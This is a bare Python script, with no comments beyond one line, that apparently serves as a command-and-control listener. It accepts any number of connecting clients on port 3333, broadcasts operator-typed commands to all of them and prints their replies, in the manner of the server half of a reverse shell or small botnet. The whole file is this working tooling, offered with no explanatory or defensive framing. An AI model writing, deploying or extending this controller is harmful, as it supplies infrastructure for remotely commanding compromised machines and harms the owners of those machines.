from socket import *
import threading


def worker(server):
    while True:
        client, addr = server.accept()
        clients.append(client)


server = socket(AF_INET, SOCK_STREAM)
server.bind(("",3333))
server.listen(100)
clients = []

t = threading.Thread(target=worker, args=(server,))
t.start()

# we got a client
while True:
    data = input("[+] Server Command: ")

    if clients:
        for client in clients:
            try:
                client.sendall(data.encode())
                result = client.recv(2048).decode()
                print (result)
            except:
                clients.remove(client)
